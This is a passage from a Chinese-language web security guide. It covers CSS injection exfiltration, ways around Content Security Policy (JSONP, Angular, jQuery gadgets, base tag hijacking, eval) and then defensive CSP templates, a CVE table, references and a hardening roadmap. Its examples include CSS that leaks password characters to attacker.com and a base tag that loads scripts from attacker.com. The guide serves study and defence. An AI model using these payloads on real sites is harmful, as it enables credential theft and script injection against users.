#### C4.3 进阶：CSS Attribute Selector 外传

```html
<!-- 当攻击者可注入 CSS -->
<style>
input[value^="admin"] { background: url(https://attacker.com/?leak=admin); }
input[value^="root"] { background: url(https://attacker.com/?leak=root); }
/* 逐字符枚举用户的密码字段值 */
</style>

<input type="password" name="password" value="">
```

来源: [PortSwigger — Dangling Markup Injection](https://portswigger.net/web-security/dangling-markup)

---

### C5. CSP 进阶绕过（2025-2026）

#### C5.1 script-src 'self' → JSONP 端点绕过

```html
<!-- 应用 CSP: script-src 'self' -->

<!-- 找到同源的 JSONP 端点 -->
<script src="/api/callback?callback=alert(1)//"></script>
<!-- 服务端返回: alert(1)//({"data": "..."}) -->

<!-- Angular 在白名单域 -->
<script src="https://cdn.example.com/angular.js"></script>
<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
```

#### C5.2 script-src 'strict-dynamic' → Script Gadget

```html
<!-- CSP: script-src 'strict-dynamic' 'nonce-xxx' -->

<!-- 利用页面已加载的可信脚本（如 jQuery / Prototype） -->
<script nonce="trusted" src="jquery.js"></script>

<!-- 通过可信脚本的 gadget 执行任意代码 -->
<div id="x" onclick="$('div').html('<img src=x onerror=alert(1)>')">click</div>
<!-- jQuery 把 onerror 当作字符串,但实际触发时执行 -->

<!-- Prototype: $evalJSON -->
<!-- MooTools: Function.django -->
```

#### C5.3 base-uri 未限制 → Base Tag 劫持

```html
<!-- CSP: 缺少 base-uri 限制 -->
<base href="https://attacker.com/">

<!-- 后续相对路径脚本被劫持 -->
<script src="js/app.js"></script>
<!-- 实际加载: https://attacker.com/js/app.js -->
```

#### C5.4 default-src 'none' + script-src 'unsafe-eval'

```html
<!-- unsafe-eval 允许 eval/setTimeout/Function -->
<script>
eval(atob('YWxlcnQoMSk='));  // base64("alert(1)")
setTimeout("alert(1)", 0);
new Function('alert(1)')();
</script>
```

#### C5.5 CSP Evaluator & 速查工具

- [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com/) — Google 官方 CSP 评估
- [cspvalidator.org](https://cspvalidator.org/) — CSP 验证
- [CSP Evaluator by Upskill](https://upskill.securityblue.team/) — 训练用

#### C5.6 严格 CSP 模板（2025 推荐）

```http
# 模板 1: nonce-based（最严格）
Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-{random}' 'strict-dynamic';
  style-src 'nonce-{random}';
  img-src 'self';
  connect-src 'self';
  frame-ancestors 'none';
  base-uri 'none';
  form-action 'self';
  require-trusted-types-for 'script';

# 模板 2: hash-based（适合静态脚本）
Content-Security-Policy:
  script-src 'sha256-abc123...' 'strict-dynamic';

# 模板 3: Report-Only 渐进式部署
Content-Security-Policy-Report-Only:
  script-src 'nonce-{random}' 'strict-dynamic';
  report-uri /csp-report;
```

来源: [web.dev — Strict CSP](https://web.dev/articles/strict-csp?hl=zh-cn) / [Google — CSP Evaluator](https://csp-evaluator.withgoogle.com/)

---

### C6. 2025-2026 综合 CVE 速查（CSRF/CORS/Clickjacking）

| CVE | 产品 | 类型 | 来源 |
|------|------|------|------|
| **CVE-2025-55462** | Eramba v3.26.0 | CORS Origin 反射 | [NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-55462) |
| CVE-2025-55241 | Microsoft Entra ID | 跨租户身份冒充 | [Hacker News](https://thehackernews.com/2025/09/microsoft-patches-critical-entra-id.html) |
| GHSA-wm5p-7pr7-c8rw | FreshRSS | Clickjacking → XSS | [GitHub Advisory](https://github.com/FreshRSS/FreshRSS/security/advisories/GHSA-wm5p-7pr7-c8rw) |
| 多个 | 浏览器密码管理器扩展 | DOM-based Clickjacking | [Marek Toth Research](https://marektoth.com/blog/dom-based-extension-clickjacking/) |

---

### C7. 奇安信/中文社区精华

#### C7.1 奇安信攻防社区

- 持续关注 [奇安信攻防社区](https://forum.butian.net/community/all) CSRF / CORS / Clickjacking 实战文章
- 奇安信代码安全实验室的 Web 漏洞研究

#### C7.2 腾讯云 / 阿里云

- [腾讯云 — CORS 配置安全](https://cloud.tencent.com/developer/article/1764071)
- [阿里云 — CSP 绕过技巧](https://developer.aliyun.com/article/1235821)
- 阿里云漏洞库 (avd.aliyun.com) 实时 CVE

#### C7.3 国际参考（深度阅读）

- [PortSwigger — CSRF](https://portswigger.net/web-security/csrf)
- [PortSwigger — CORS](https://portswigger.net/web-security/cors)
- [PortSwigger — Clickjacking](https://portswigger.net/web-security/clickjacking)
- [PortSwigger — CSP](https://portswigger.net/web-security/csp)
- [PortSwigger — Dangling Markup](https://portswigger.net/web-security/dangling-markup)
- [PortSwigger — SameSite Bypass](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)
- [PortSwigger — Cookie Chaos (__Host- bypass)](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes)
- [OWASP — CSRF Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP — Clickjacking Defense](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [OWASP — CORS Misconfiguration](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing)
- [OWASP — CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [Auth0 — Preventing Clickjacking](https://auth0.com/blog/preventing-clickjacking-attacks/)
- [Intigriti — CORS Advanced Exploitation](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-cors-misconfiguration-vulnerabilities)
- [Marek Toth — DOM-based Extension Clickjacking](https://marektoth.com/blog/dom-based-extension-clickjacking/)
- [hazanasec — SameSite Method Override](https://hazanasec.github.io/2023-07-30-Samesite-bypass-method-override.md/)
- [Renwa — SameSite Lax Bypass](https://medium.com/@renwa/bypass-samesite-cookies-default-to-lax-and-get-csrf-343ba09b9f2b)
- [Kensai — CORS Top Bug Bounty 2026](https://kensai.app/blog/cors-misconfiguration-most-common-bug-bounty-finding-2026)
- [SentinelOne — Clickjacking Prevention 2026](https://www.sentinelone.com/cybersecurity-101/threat-intelligence/clickjacking-prevention/)

---

### C8. 2025-2026 防御升级路线图

| 层级 | 措施 | 优先级 |
|------|------|--------|
| **CSRF** | CSRF Token（每个请求） | P0 |
| **CSRF** | SameSite=Strict（关键 Cookie） | P0 |
| **CSRF** | 禁用 Method Override | P1 |
| **CSRF** | 关键操作二次确认 | P0 |
| **CSRF** | Cookie __Host- 前缀 | P1 |
| **CORS** | 严格白名单（精确匹配） | P0 |
| **CORS** | 禁用通配子域 | P0 |
| **CORS** | Allow-Credentials: true 时禁用通配 Origin | P0 |
| **CORS** | 拒绝 null Origin | P0 |
| **Clickjacking** | frame-ancestors 'none'（敏感页面） | P0 |
| **Clickjacking** | X-Frame-Options: DENY（兼容旧浏览器） | P1 |
| **Clickjacking** | 关键操作二次确认 | P0 |
| **CSP** | strict-dynamic + nonces | P0 |
| **CSP** | base-uri 'none' | P0 |
| **CSP** | frame-ancestors 限制 | P0 |
| **CSP** | require-trusted-types-for 'script' | P1 |
| **CSP** | Report-Only 渐进部署 | P1 |
| **Cookie** | HttpOnly + Secure + SameSite=Strict + __Host- | P0 |
| **检测** | CSP 违规报告监控 | P2 |
| **应急** | Cookie 紧急吊销机制 | P0 |
